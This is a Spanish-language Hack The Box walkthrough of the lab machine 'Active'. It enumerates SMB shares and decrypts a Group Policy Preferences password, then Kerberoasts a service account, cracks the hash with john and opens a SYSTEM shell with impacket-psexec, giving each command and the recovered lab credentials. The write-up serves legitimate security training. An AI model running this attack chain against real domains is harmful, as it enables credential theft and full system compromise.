# Máquina Active

Enlace a la máquina -> [HackTheBox](https://app.hackthebox.com/machines/Active)

![imagen](https://github.com/user-attachments/assets/2627155e-4736-4c13-9fbf-c411474beee3)

- **Nombre de la Máquina:** Active  
- **Sistema Operativo:** Windows  
- **Dificultad:** Fácil  
- **Plataforma:** Hack The Box  
- **Dirección IP:** 10.10.10.100 
- **Skills**
  - SMB Enumeration
  - Abusing GPP Passwords
  - Decrypting GPP Passwords - gpp-decrypt
  - Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]

## Reconocimiento y Enumeración

Comenzamos realizando un escaneo general utilizando Nmap para identificar los puertos abiertos y sus versiones en la IP del objetivo:

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn -sCV 10.10.10.100 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/2d064e91-4450-46e2-bb8f-fad0b89176ff)

El reporte de `Nmap` indica que nos encontramos con un Domain Controller de **Active Directory**, ya que se identificaron puertos comunes como el `88` (**Kerberos**), `389` (**LDAP**), `139` y `445` (**SMB**), `53` (**DNS**), entre otros. También se sugiere que el controlador de dominio es **Windows Server 2008 R2 SP1**. 

Además, se identificó el dominio `active.htb` y se agregó a `/etc/hosts` con la dirección IP de la máquina objetivo para una traducción correcta.

![imagen](https://github.com/user-attachments/assets/f2eff7db-b4f6-4eca-b548-33d224f9d69f)

### SMB - 139/445

Al disponer del servicio SMB, procedemos a llevar a cabo una enumeración de los recursos compartidos utilizando `smbmap`.

```bash
smbmap -H 10.10.10.100 --no-pass
```

![imagen](https://github.com/user-attachments/assets/104a78c7-caee-4bec-aa16-2c5f7d928383)

Se observa que el único recurso compartido al que tenemos permisos de lectura es "**Replication**".

```bash
smbclient //10.10.10.100/Replication -N
```

![imagen](https://github.com/user-attachments/assets/64a31bb2-a48d-4ffa-aa5b-849c618ac4d6)

Al revisar la estructura, parece ser una copia de **SYSVOL**. Esto es potencialmente interesante desde el punto de vista de la escalada de privilegios, ya que las directivas de grupo (y las preferencias de directivas de grupo) se almacenan en el recurso compartido **SYSVOL**, el cual es legible para todos los usuarios autenticados.

Dado este contexto, resulta relevante buscar el archivo `Groups.xml`, ya que a menudo contiene credenciales de Active Directory. En este caso, lo encontramos en la siguiente ruta: `Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`. Luego, procedimos a descargarlo en nuestra máquina local.

```bash
prompt off
recurse on
mget *
```

![imagen](https://github.com/user-attachments/assets/2f94e08c-c7b3-4720-bee9-57b4769f7682)

El contenido del archivo revela la contraseña encriptada `cpassword`.

```bash
grep -Ri password
```

![imagen](https://github.com/user-attachments/assets/6b837349-8ae9-416e-8245-db15689d1b68)

En este punto, es importante señalar que las Preferencias de **Directiva de Grupo (GPP)** se introdujeron en **Windows Server 2008** y permitían a los administradores modificar usuarios y grupos en toda la red, entre otras características. Un caso de uso típico era cuando la imagen base de una empresa tenía una contraseña de administrador local débil y los administradores deseaban cambiarla a algo más seguro de manera retrospectiva. La contraseña definida se cifraba con `AES-256` y se almacenaba en el archivo `Groups.xml`.

Sin embargo, en algún momento de 2012, Microsoft publicó la clave AES en MSDN, lo que significa que las contraseñas establecidas mediante GPP ahora son triviales de descifrar y se consideran fácilmente accesibles.

Bajo este contexto, es posible descifrar la contraseña utilizando la utilidad `gpp-decrypt`.

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

![imagen](https://github.com/user-attachments/assets/a0ff0246-1573-4a55-ac8b-ebfb5cc77fd8)

Ahora tenemos conocimiento de que la cuenta de dominio `SVC_TGS` tiene la contraseña `GPPstillStandingStrong2k18`.

### Enumeración autenticada

Con credenciales válidas para el dominio `active.htb`, podemos proceder a la enumeración. Ahora tenemos acceso a los recursos compartidos **NETLOGON**, **SYSVOL** y **Users**.

```bash
netexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

![imagen](https://github.com/user-attachments/assets/5e144676-13b1-4079-8121-629eb6d09f7f)

# Explotación

---

### Kerberoasting Attack (GetUserSPNs.py)

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
```

![imagen](https://github.com/user-attachments/assets/b1d95cd6-0c27-414f-b14a-d286fcbe805c)

Crackeamos fácilmente el hash utilizando `john` y obtenemos la contraseña en texto plano.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![imagen](https://github.com/user-attachments/assets/1911fdb1-422a-4c4f-8e63-f29530fccdf6)

Validamos con `netexec` para verificar si la contraseña es correcta.

![imagen](https://github.com/user-attachments/assets/fe9e9a8a-fc3b-45a8-a9b8-8a35c4b5d6ee)

Ahora podemos utilizar `impacket-psexec` para obtener un shell como `nt authority\system`.

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```

![imagen](https://github.com/user-attachments/assets/4409a105-571d-45d7-9712-de55292511fd)

```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

![imagen](https://github.com/user-attachments/assets/9e094303-b4b9-4169-bf3e-c35d25a2e083)
